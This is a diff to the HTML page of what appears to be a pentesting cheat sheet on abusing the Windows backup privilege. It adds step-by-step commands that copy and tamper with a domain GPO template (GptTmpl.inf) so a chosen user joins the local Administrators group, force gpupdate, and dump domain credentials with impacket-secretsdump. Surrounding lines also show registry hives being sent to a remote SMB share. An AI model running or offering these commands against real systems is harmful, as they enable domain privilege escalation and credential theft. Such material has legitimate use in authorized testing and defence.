@@ -328,7 +328,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </style>
   <h3 id="abuse-1-robocopy">Abuse #1: Robocopy</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example
-</span></span><span class="line"><span class="cl"><span class="go">robocopy /b &lt;TARGET_DIR_PATH&gt; C:\Windows\Tasks &lt;TARGET_FILE&gt;
+</span></span><span class="line"><span class="cl"><span class="go">robocopy /b &lt;TARGET_DIR_PATH&gt; &lt;DEST_DIR&gt; &lt;TARGET_FILE&gt;
 </span></span></span></code></pre></div><hr>
 <h3 id="abuse-2-helper-dlls">Abuse #2: Helper dlls</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module .\SeBackupPrivilegeCmdLets.dll
@@ -435,6 +435,28 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">Dumping SECURITY hive to \\10.10.14.2\share\SECURITY
 </span></span></span></code></pre></div><h4 id="3-secrets-dump">3. Secrets Dump</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/mpgn/BackupOperatorToDA">BackupOperatorToDA.exe</a></em></small></p>
+<hr>
+<h3 id="abuse-5-modify-gpttmplinf">Abuse #5: Modify GptTmpl.inf</h3>
+<h4 id="1-copy-gpttmplinf">1. Copy GptTmpl.inf</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">robocopy /b &#34;\\&lt;DOMAIN&gt;\sysvol\&lt;DOMAIN&gt;\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit&#34; &#34;C:\ProgramData&#34; GptTmpl.inf
+</span></span></span></code></pre></div><h4 id="2-check-target-user-sid">2. Check Target User SID</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainUser | Select-Object samaccountname, objectsid
+</span></span></span></code></pre></div><h4 id="3-add-target-user-to-local-admin-group">3. Add Target User to Local Admin Group</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Append to GptTmpl.inf
+</span></span><span class="line"><span class="cl"><span class="go">[Group Membership]
+</span></span></span><span class="line"><span class="cl"><span class="go">*&lt;SID&gt;__Memberof = *S-1-5-32-544
+</span></span></span><span class="line"><span class="cl"><span class="go">*&lt;SID&gt;__Members =
+</span></span></span><span class="line"><span class="cl"><span class="go">*S-1-5-32-544__Memberof =
+</span></span></span><span class="line"><span class="cl"><span class="go">*S-1-5-32-544__Members = *&lt;SID&gt;
+</span></span></span></code></pre></div><h4 id="4-overwrite-original-gpttmplinf">4. Overwrite Original GptTmpl.inf</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">robocopy /b &#34;C:\Programdata&#34; &#34;\\&lt;DOMAIN&gt;\sysvol\&lt;DOMAIN&gt;\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit&#34; GptTmpl.inf
+</span></span></span></code></pre></div><h4 id="5-wait">5. Wait</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Wait or force gpupdate <span class="o">(</span><span class="k">if</span> possible<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">gpupdate /force
+</span></span></span></code></pre></div><h4 id="6-secrets-dump">6. Secrets Dump</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET_DOMAIN&gt;&#39; -dc-ip &lt;DC_IP&gt;
 </span></span></span></code></pre></div>
 </div></div>
     
